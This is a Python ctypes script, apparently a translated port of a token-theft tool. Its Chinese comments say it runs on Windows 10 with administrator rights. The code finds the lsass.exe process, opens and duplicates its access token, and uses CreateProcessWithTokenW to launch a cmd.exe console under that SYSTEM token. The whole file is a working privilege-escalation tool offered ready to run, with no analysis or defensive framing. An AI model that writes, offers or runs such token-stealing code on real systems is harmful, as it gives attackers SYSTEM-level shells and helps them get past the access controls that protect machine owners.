# !! 此代码由ChatGPT转码 https://github.com/hmoytx/ttttokencmd/blob/master/Systemcmd/Systemcmd.cpp
# !! 经简单修改能正常于Windows10 1909中运行，需先获取管理员权限
import ctypes
from ctypes import wintypes
import sys

# 常量定义
TH32CS_SNAPPROCESS = 0x00000002
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value

PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
TOKEN_ASSIGN_PRIMARY = 0x0001
TOKEN_DUPLICATE = 0x0002
TOKEN_IMPERSONATE = 0x0004
TOKEN_QUERY = 0x0008

CREATE_NEW_CONSOLE = 0x00000010
LOGON_NETCREDENTIALS_ONLY = 2
MAXIMUM_ALLOWED = 0x02000000

# 结构体定义
class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.c_size_t),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", wintypes.LONG),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", wintypes.WCHAR * 260)
    ]

class STARTUPINFO(ctypes.Structure):
    _fields_ = [
        ('cb', wintypes.DWORD),
        ('lpReserved', wintypes.LPWSTR),
        ('lpDesktop', wintypes.LPWSTR),
        ('lpTitle', wintypes.LPWSTR),
        ('dwX', wintypes.DWORD),
        ('dwY', wintypes.DWORD),
        ('dwXSize', wintypes.DWORD),
        ('dwYSize', wintypes.DWORD),
        ('dwXCountChars', wintypes.DWORD),
        ('dwYCountChars', wintypes.DWORD),
        ('dwFillAttribute', wintypes.DWORD),
        ('dwFlags', wintypes.DWORD),
        ('wShowWindow', wintypes.WORD),
        ('cbReserved2', wintypes.WORD),
        ('lpReserved2', ctypes.POINTER(ctypes.c_byte)),
        ('hStdInput', wintypes.HANDLE),
        ('hStdOutput', wintypes.HANDLE),
        ('hStdError', wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('hProcess', wintypes.HANDLE),
        ('hThread', wintypes.HANDLE),
        ('dwProcessId', wintypes.DWORD),
        ('dwThreadId', wintypes.DWORD),
    ]

def find_process_pid(process_name):
    """查找指定进程名的PID"""
    CreateToolhelp32Snapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot
    Process32First = ctypes.windll.kernel32.Process32FirstW
    Process32Next = ctypes.windll.kernel32.Process32NextW
    CloseHandle = ctypes.windll.kernel32.CloseHandle

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot == INVALID_HANDLE_VALUE:
        print("CreateToolhelp32Snapshot失败")
        return None

    pe32 = PROCESSENTRY32()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)

    if not Process32First(snapshot, ctypes.byref(pe32)):
        print("Process32First失败")
        CloseHandle(snapshot)
        return None

    pid = None
    while True:
        exe_file = pe32.szExeFile
        # 打印找到的进程（调试用）
        # print(f"Found process: {exe_file} with PID: {pe32.th32ProcessID}")
        if exe_file.lower() == process_name.lower():
            pid = pe32.th32ProcessID
            break
        if not Process32Next(snapshot, ctypes.byref(pe32)):
            break

    CloseHandle(snapshot)
    if pid is not None:
        print(f"找到进程 {process_name}，PID为: {pid}")
    else:
        print(f"未找到进程 {process_name}")
    return pid

def get_process_token(pid):
    """获取指定PID的进程令牌"""
    OpenProcess = ctypes.windll.kernel32.OpenProcess
    OpenProcess.restype = wintypes.HANDLE
    OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]

    process_handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
    if not process_handle:
        print("OpenProcess失败")
        return None

    OpenProcessToken = ctypes.windll.advapi32.OpenProcessToken
    OpenProcessToken.restype = wintypes.BOOL
    OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]

    token_handle = wintypes.HANDLE()
    if not OpenProcessToken(process_handle, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, ctypes.byref(token_handle)):
        print("OpenProcessToken失败")
        ctypes.windll.kernel32.CloseHandle(process_handle)
        return None

    ctypes.windll.kernel32.CloseHandle(process_handle)
    print("成功获取进程令牌")
    return token_handle

def run(token_handle):
    """使用复制的令牌启动新进程"""
    # 复制令牌
    DuplicateTokenEx = ctypes.windll.advapi32.DuplicateTokenEx
    DuplicateTokenEx.restype = wintypes.BOOL
    DuplicateTokenEx.argtypes = [
        wintypes.HANDLE,  # Existing token handle
        wintypes.DWORD,   # Desired access
        ctypes.POINTER(ctypes.c_void_p),  # Token attributes (optional)
        wintypes.DWORD,   # Impersonation level
        wintypes.DWORD,   # Token type
        ctypes.POINTER(wintypes.HANDLE)  # New token handle
    ]

    new_token = wintypes.HANDLE()
    res = DuplicateTokenEx(
        token_handle,
        MAXIMUM_ALLOWED,
        None,
        2,   # SecurityImpersonation
        1,   # TokenPrimary
        ctypes.byref(new_token)
    )

    if not res:
        error = ctypes.GetLastError()
        print("DuplicateTokenEx失败，错误代码:", error)
        return

    print("成功复制令牌")

    # 准备调用CreateProcessWithTokenW
    CreateProcessWithTokenW = ctypes.windll.advapi32.CreateProcessWithTokenW
    CreateProcessWithTokenW.restype = wintypes.BOOL
    CreateProcessWithTokenW.argtypes = [
        wintypes.HANDLE,   # hToken
        wintypes.DWORD,    # dwLogonFlags
        wintypes.LPCWSTR,  # lpApplicationName
        wintypes.LPCWSTR,  # lpCommandLine
        wintypes.DWORD,    # dwCreationFlags
        wintypes.LPVOID,   # lpEnvironment
        wintypes.LPCWSTR,  # lpCurrentDirectory
        ctypes.POINTER(STARTUPINFO), # lpStartupInfo
        ctypes.POINTER(PROCESS_INFORMATION) # lpProcessInformation
    ]

    # 定义要启动的命令
    cmd = "C:\\Windows\\System32\\cmd.exe"

    # 初始化结构体
    si = STARTUPINFO()
    si.cb = ctypes.sizeof(STARTUPINFO)
    pi = PROCESS_INFORMATION()

    # 调用CreateProcessWithTokenW
    ret = CreateProcessWithTokenW(
        new_token,
        LOGON_NETCREDENTIALS_ONLY,
        None,  # lpApplicationName
        cmd,
        CREATE_NEW_CONSOLE,
        None,  # lpEnvironment
        None,  # lpCurrentDirectory
        ctypes.byref(si),
        ctypes.byref(pi)
    )

    if not ret:
        error = ctypes.GetLastError()
        print("CreateProcessWithTokenW失败，错误代码:", error)
    else:
        print(f"成功创建进程，PID为: {pi.dwProcessId}")
        # 关闭句柄
        ctypes.windll.kernel32.CloseHandle(pi.hProcess)
        ctypes.windll.kernel32.CloseHandle(pi.hThread)

    # 关闭复制的令牌句柄
    ctypes.windll.kernel32.CloseHandle(new_token)

def main():
    # 需管理员权限...
    process_name = "lsass.exe"
    pid = find_process_pid(process_name)
    if not pid:
        print("无法找到指定进程的PID")
        sys.exit(1)

    token_handle = get_process_token(pid)
    if not token_handle:
        print("无法获取进程令牌")
        sys.exit(1)

    run(token_handle)

    # 关闭原始令牌句柄
    ctypes.windll.kernel32.CloseHandle(token_handle)

if __name__ == "__main__":
    main()
